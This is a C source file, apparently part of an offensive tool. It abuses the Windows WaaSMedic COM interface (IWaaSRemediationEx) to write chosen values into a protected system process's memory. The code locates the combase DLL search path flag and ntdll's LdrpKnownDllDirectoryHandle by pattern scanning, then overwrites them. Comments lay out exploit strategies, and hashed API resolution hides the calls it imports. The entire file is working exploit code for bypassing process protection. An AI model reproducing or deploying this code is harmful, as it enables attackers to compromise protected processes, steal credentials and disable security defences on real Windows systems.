#include "ppl/medic_client.h"

BOOL initialize_interface(
    PIWaaSRemediationEx* IWaaSRemediationEx)
{
    BOOL    ret_val               = FALSE;
    HRESULT ComResult             = 0;
    CLSID   CLSID_WaaSRemediation = CLSID_WAASREMEDIATION;
    IID     IID_WaaSRemediationEx = IID_WAASREMEDIATIONEX;

    CoInitializeEx_t           CoInitializeEx           = NULL;
    CoCreateInstance_t         CoCreateInstance         = NULL;
    CoEnableCallCancellation_t CoEnableCallCancellation = NULL;

    CoInitializeEx = (CoInitializeEx_t)(ULONG_PTR)get_function_address(
        get_library_address(OLE32_DLL, TRUE),
        CoInitializeEx_SW2_HASH,
        0);
    if (!CoInitializeEx)
    {
        api_not_found("CoInitializeEx");
        goto cleanup;
    }

    CoCreateInstance = (CoCreateInstance_t)(ULONG_PTR)get_function_address(
        get_library_address(OLE32_DLL, TRUE),
        CoCreateInstance_SW2_HASH,
        0);
    if (!CoCreateInstance)
    {
        api_not_found("CoCreateInstance");
        goto cleanup;
    }

    CoEnableCallCancellation = (CoEnableCallCancellation_t)(ULONG_PTR)get_function_address(
        get_library_address(OLE32_DLL, TRUE),
        CoEnableCallCancellation_SW2_HASH,
        0);
    if (!CoEnableCallCancellation)
    {
        api_not_found("CoEnableCallCancellation");
        goto cleanup;
    }

    ComResult = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(ComResult))
    {
        function_failed("CoInitializeEx");
        goto cleanup;
    }

    ComResult = CoCreateInstance(
        &CLSID_WaaSRemediation,
        NULL,
        CLSCTX_LOCAL_SERVER,
        &IID_WaaSRemediationEx,
        (LPVOID *)IWaaSRemediationEx);
    if (FAILED(ComResult))
    {
        function_failed("CoCreateInstance");
        goto cleanup;
    }

    ComResult = CoEnableCallCancellation(NULL);
    if (FAILED(ComResult))
    {
        function_failed("CoEnableCallCancellation");
        goto cleanup;
    }

    ret_val = TRUE;

cleanup:
    return ret_val;
}

BOOL resolve_dispatch_ids(
    IN PIWaaSRemediationEx IWaaSRemediationEx,
    OUT DISPID *DispIdLaunchDetectionOnly,
    OUT DISPID *DispIdLaunchRemediationOnly)
{
    BOOL    ret_val                   = FALSE;
    HRESULT ComResult                 = 0;
    LPWSTR  pwszLaunchDetectionOnly   = STR_METHOD_LAUNCHDETECTIONONLY;
    LPWSTR  pwszLaunchRemediationOnly = STR_METHOD_LAUNCHREMEDIATIONONLY;
    IID     IID_Null                  = IID_ALL_ZERO;

    ComResult = IWaaSRemediationEx_GetIDsOfNames(IWaaSRemediationEx, &IID_Null, &pwszLaunchDetectionOnly, 1, 1033, DispIdLaunchDetectionOnly);
    if (FAILED(ComResult))
    {
        function_failed("GetIDsOfNames");
        goto cleanup;
    }

    ComResult = IWaaSRemediationEx_GetIDsOfNames(IWaaSRemediationEx, &IID_Null, &pwszLaunchRemediationOnly, 1, 1033, DispIdLaunchRemediationOnly);
    if (FAILED(ComResult))
    {
        function_failed("GetIDsOfNames");
        goto cleanup;
    }

    ret_val = TRUE;

cleanup:
    
    if (ret_val)
    {
        DPRINT("LDO ID: 0x%08lx | LRO ID: 0x%08lx", *DispIdLaunchDetectionOnly, *DispIdLaunchRemediationOnly);
    }

    return ret_val;
}

BOOL write_remote_dll_search_path_flag(
    IN PIWaaSRemediationEx IWaaSRemediationEx,
    IN DISPID DispIdLaunchRemediationOnly)
{
    BOOL                                    ret_val                   = FALSE;
    BOOL                                    success                   = FALSE;
    ULONG_PTR                               pDllSearchPathFlagAddress = 0;
    WRITE_REMOTE_DLL_SEARCH_PATH_FLAG_PARAM WriteParams               = { 0 };
    DWORD                                   dwThreadId                = 0;
    DWORD                                   dwThreadExitCode          = 0;
    HANDLE                                  hThread                   = NULL;
    HRESULT                                 ComResult                 = 0;

    // TODO: dinvoke, syscalls

    SysAllocString_t SysAllocString = NULL;
    CoCancelCall_t   CoCancelCall = NULL;

    SysAllocString = (SysAllocString_t)(ULONG_PTR)get_function_address(
        get_library_address(OLEAUT32_DLL, TRUE),
        SysAllocString_SW2_HASH,
        0);
    if (!SysAllocString)
    {
        api_not_found("SysAllocString");
        goto cleanup;
    }

    CoCancelCall = (CoCancelCall_t)(ULONG_PTR)get_function_address(
        get_library_address(OLE32_DLL, TRUE),
        CoCancelCall_SW2_HASH,
        0);
    if (!CoCancelCall)
    {
        api_not_found("CoCancelCall");
        goto cleanup;
    }

    success = find_combase_dll_search_flag_address(&pDllSearchPathFlagAddress);
    if (!success)
        goto cleanup;

    memset(&WriteParams, 0, sizeof(WriteParams));
    WriteParams.CallerApplicationName       = SysAllocString(L"");
    WriteParams.Plugins                     = SysAllocString(L"");
    WriteParams.DispIdLaunchRemediationOnly = DispIdLaunchRemediationOnly;
    WriteParams.WaaSRemediationEx           = IWaaSRemediationEx;
    WriteParams.WriteAt                     = pDllSearchPathFlagAddress - 8;

    hThread = CreateThread(NULL, 0, write_remote_dll_search_path_flag_thread, &WriteParams, 0, &dwThreadId);
    if (!hThread)
    {
        function_failed("CreateThread");
        goto cleanup;
    }

    if (WaitForSingleObject(hThread, TIMEOUT) != WAIT_OBJECT_0)
    {
        DPRINT("Thread with ID %ld is taking too long, cancelling...", dwThreadId);
        ComResult = CoCancelCall(dwThreadId, TIMEOUT);
        goto cleanup;
    }

    success = GetExitCodeThread(hThread, &dwThreadExitCode);
    if (!success)
        goto cleanup;

    if (dwThreadExitCode != ERROR_SUCCESS)
        goto cleanup;

    ret_val = TRUE;

cleanup:
    safe_close_handle(&hThread);

    if (ret_val)
    {
        DPRINT("COM result: 0x%08x", (ULONG32)ComResult);
    }

    if (!ret_val)
    {
        DPRINT_ERR("Failed to write DLL search path flag in remote process (thread exit code: 0x%08lx).", dwThreadExitCode);
    }

    return ret_val;
}

HRESULT invoke_launch_remediation_only(
    IN PIWaaSRemediationEx Interface,
    IN DISPID DispId,
    IN BSTR Plugins,
    IN BSTR CallerApplicationName,
    IN ULONG_PTR Result)
{
    DISPPARAMS Params                      = { 0 };
    VARIANT    VarResult                   = { 0 };
    EXCEPINFO  ExcepInfo                   = { 0 };
    UINT       ArgErr                      = 0xffffffff;
    VARIANTARG ArgLaunchRemediationOnly[3] = { 0 };
    IID        IID_Null                    = IID_ALL_ZERO;

    memset(&ArgLaunchRemediationOnly, 0, sizeof(ArgLaunchRemediationOnly));
    ArgLaunchRemediationOnly[0].vt      = VT_UI8;
    ArgLaunchRemediationOnly[0].ullVal  = Result;
    ArgLaunchRemediationOnly[1].vt      = VT_BSTR;
    ArgLaunchRemediationOnly[1].bstrVal = CallerApplicationName;
    ArgLaunchRemediationOnly[2].vt      = VT_BSTR;
    ArgLaunchRemediationOnly[2].bstrVal = Plugins;

    memset(&Params, 0, sizeof(Params));
    Params.cArgs             = sizeof(ArgLaunchRemediationOnly) / sizeof(*ArgLaunchRemediationOnly);
    Params.rgvarg            = ArgLaunchRemediationOnly;
    Params.cNamedArgs        = 0;
    Params.rgdispidNamedArgs = NULL;

    return IWaaSRemediationEx_Invoke(Interface, DispId, &IID_Null, 1033, DISPATCH_METHOD, &Params, &VarResult, &ExcepInfo, &ArgErr);
}

BOOL calculate_write_addresses(
    IN PVOID BaseAddress,
    OUT PDWORD64 WriteAtLaunchDetectionOnly,
    OUT PDWORD64 WriteAtLaunchRemediationOnly)
{
    //
    // _BaseAddress: address of ntdll!LdrpKnownDllDirectoryHandle
    // _WriteAtLaunchDetectionOnly: address used to write the result of LaunchDetectionOnly
    // _WriteAtLaunchRemediationOnly: address used to write the result of LaunchRemediationOnly
    //
    // First strategy: keep value at index 0
    // 
    //   After the call to LaunchDetectionOnly
    //     00007fff`971dc028  00 00 00 00  00 00 00 00    <- (LdrpFatalHardErrorCount)
    //     00007fff`971dc030  HH XX XX XX  XX XX 00 00    <- LdrpKnownDllDirectoryHandle
    //     00007fff`971dc038  00 00 00 00  00 00 00 00    <- NOT USED
    // 
    //   After the call to LaunchRemediationOnly (1)
    //     00007fff`971dc028  00 17 00 00  00 00 00 00    <- (LdrpFatalHardErrorCount)
    //     00007fff`971dc030  HH 00 00 00  00 XX 00 00    <- LdrpKnownDllDirectoryHandle
    //     00007fff`971dc038  00 00 00 00  00 00 00 00    <- NOT USED
    // 
    //      After the call to LaunchRemediationOnly (2)
    //     00007fff`971dc028  00 17 17 00  00 00 00 00    <- (LdrpFatalHardErrorCount)
    //     00007fff`971dc030  HH 00 00 00  00 00 00 00    <- LdrpKnownDllDirectoryHandle
    //     00007fff`971dc038  00 00 00 00  00 00 00 00    <- NOT USED
    // 
    // Second strategy: keep value at index 1
    // 
    //   After the call to LaunchDetectionOnly
    //     00007fff`971dc028  00 00 00 00  00 00 00 XX    <- (LdrpFatalHardErrorCount)
    //     00007fff`971dc030  HH XX XX XX  XX 00 00 00    <- LdrpKnownDllDirectoryHandle
    //     00007fff`971dc038  00 00 00 00  00 00 00 00    <- NOT USED
    //
    //   After the call to LaunchRemediationOnly
    //     00007fff`971dc028  00 17 00 00  00 00 00 XX    <- (LdrpFatalHardErrorCount)
    //     00007fff`971dc030  HH 00 00 00  00 00 00 00    <- LdrpKnownDllDirectoryHandle
    //     00007fff`971dc038  00 00 00 00  00 00 00 00    <- NOT USED
    //

    // TODO: implement strategy
    //if (_Strategy == ExploitStrategy::ExtractByteAtIndex0)
    if (TRUE)
    {
        *WriteAtLaunchDetectionOnly = (DWORD64)(ULONG_PTR)BaseAddress;       // Write value XX XX XX XX XX XX 00 00 @ ntdll!LdrpKnownDllDirectoryHandle
        *WriteAtLaunchRemediationOnly = (DWORD64)(ULONG_PTR)BaseAddress - 7; // Write 00 00 00 00 @ LdrpKnownDllDirectoryHandle+1 (+1 again for the second call)
        return TRUE;
    }
    //else if (_Strategy == ExploitStrategy::ExtractByteAtIndex1)
    else
    {
        *WriteAtLaunchDetectionOnly = (DWORD64)(ULONG_PTR)BaseAddress - 1;   // Write value XX XX XX XX XX XX 00 00 @ ntdll!LdrpKnownDllDirectoryHandle-1
        *WriteAtLaunchRemediationOnly = (DWORD64)(ULONG_PTR)BaseAddress - 7; // Write 00 00 00 00 @ LdrpKnownDllDirectoryHandle+1
        return TRUE;
    }

    return FALSE;
}

DWORD WINAPI write_remote_dll_search_path_flag_thread(LPVOID Parameter)
{
    PWRITE_REMOTE_DLL_SEARCH_PATH_FLAG_PARAM WriteParams = (PWRITE_REMOTE_DLL_SEARCH_PATH_FLAG_PARAM)Parameter;
    HRESULT hr;

    hr = invoke_launch_remediation_only(
        WriteParams->WaaSRemediationEx,
        WriteParams->DispIdLaunchRemediationOnly,
        WriteParams->Plugins,
        WriteParams->CallerApplicationName,
        WriteParams->WriteAt);

    if (FAILED(hr))
    {
        DPRINT_ERR("LaunchRemediationOnly(0x%p): 0x%08lx", (PVOID)WriteParams->WriteAt, hr);
        return (DWORD)hr;
    }

    return ERROR_SUCCESS;
}

BOOL find_combase_dll_search_flag_address(
    IN PULONG_PTR Address)
{
    BOOL      ret_val                     = FALSE;
    BOOL      success                     = FALSE;
    HMODULE   hCombaseModule              = NULL;
    ULONG_PTR pCombaseTextSection         = 0;
    ULONG_PTR pCombaseDataSection         = 0;
    ULONG_PTR pCombaseDataSectionLimit    = 0;
    ULONG_PTR pPatternAddress             = 0;
    ULONG_PTR pPatternAddress2            = 0;
    DWORD     dwCombaseTextSectionSize    = 0;
    DWORD     dwCombaseDataSectionSize    = 0;
    DWORD     dwPatternOffset             = 0;
    DWORD     i                           = 0;
    BYTE      bPattern[]                  = { 0x01, 0x00, 0x13, 0x00 };
    DWORD     dwRipRelativeOffsetForward  = 0;
    DWORD     dwRipRelativeOffsetBackward = 0;
    ULONG_PTR pCandidateAddressTemp       = 0;
    ULONG_PTR pCandidateAddressForward    = 0;
    ULONG_PTR pCandidateAddressBackward   = 0;

    // TODO: dinvoke
    *Address = 0;

    hCombaseModule = LoadLibraryW(STR_MOD_COMBASE);
    if (!hCombaseModule)
    {
        function_failed("LoadLibraryW");
        goto cleanup;
    }
    success = find_module_section(hCombaseModule, ".text", &pCombaseTextSection, &dwCombaseTextSectionSize);
    if (!success)
        goto cleanup;

    success = find_module_section(hCombaseModule, ".data", &pCombaseDataSection, &dwCombaseDataSectionSize);
    if (!success)
        goto cleanup;

    success = find_module_pattern(bPattern, sizeof(bPattern), pCombaseTextSection, dwCombaseTextSectionSize, &pPatternAddress);
    if (!success)
        goto cleanup;

    //
    // Ensure that the pattern is unique. We search for the pattern once again starting at offset + 1 until
    // we reach the end of the .text section. If we find another occurrence, we should exit safely.
    //

    success = find_module_pattern(bPattern, sizeof(bPattern), pCombaseTextSection + dwPatternOffset + 1, dwCombaseTextSectionSize - dwPatternOffset - 1, &pPatternAddress2);
    if (!success)
        goto cleanup;

    dwPatternOffset = (DWORD)(pPatternAddress - (ULONG_PTR)hCombaseModule);

    //
    // Now that we found the offset of our pattern in the code, we can start searching forward and backward for
    // valid RIP-relative offsets. We consider that a RIP-relative offset is 'valid' when the value corresponding
    // to the sum of RIP and this offset falls within the .data section. We do the search both forward and 
    // backward and compare the obtained values at the end. If the values are not equal, we should exit safely.
    //

    pCombaseDataSectionLimit = pCombaseDataSection + dwCombaseDataSectionSize;

    for (i = 0; i < 32; i++)
    {
        memcpy(&dwRipRelativeOffsetForward, (PVOID)(pPatternAddress + i), sizeof(dwRipRelativeOffsetForward));
        pCandidateAddressTemp = pPatternAddress + i + sizeof(dwRipRelativeOffsetForward) + dwRipRelativeOffsetForward;
        if (pCandidateAddressTemp >= pCombaseDataSection && pCandidateAddressTemp < pCombaseDataSectionLimit)
        {
            pCandidateAddressForward = pCandidateAddressTemp;
            DPRINT("Found forward candidate:  0x%p", (PVOID)pCandidateAddressForward);
        }

        memcpy(&dwRipRelativeOffsetBackward, (PVOID)(pPatternAddress - sizeof(bPattern) - i), sizeof(dwRipRelativeOffsetBackward));
        pCandidateAddressTemp = pPatternAddress - sizeof(bPattern) - i + sizeof(dwRipRelativeOffsetBackward) + dwRipRelativeOffsetBackward;
        if (pCandidateAddressTemp >= pCombaseDataSection && pCandidateAddressTemp < pCombaseDataSectionLimit)
        {
            pCandidateAddressBackward = pCandidateAddressTemp;
            DPRINT("Found backward candidate: 0x%p", (PVOID)pCandidateAddressBackward);
        }
    }

    if (!pCandidateAddressForward || !pCandidateAddressBackward)
        goto cleanup;

    if (pCandidateAddressForward != pCandidateAddressBackward)
        goto cleanup;

    *Address = pCandidateAddressForward;
    ret_val = TRUE;

cleanup:
    if (ret_val)
    {
        DPRINT("DLL search path flag address: 0x%p", (PVOID)*Address);
    }

    return ret_val;
}
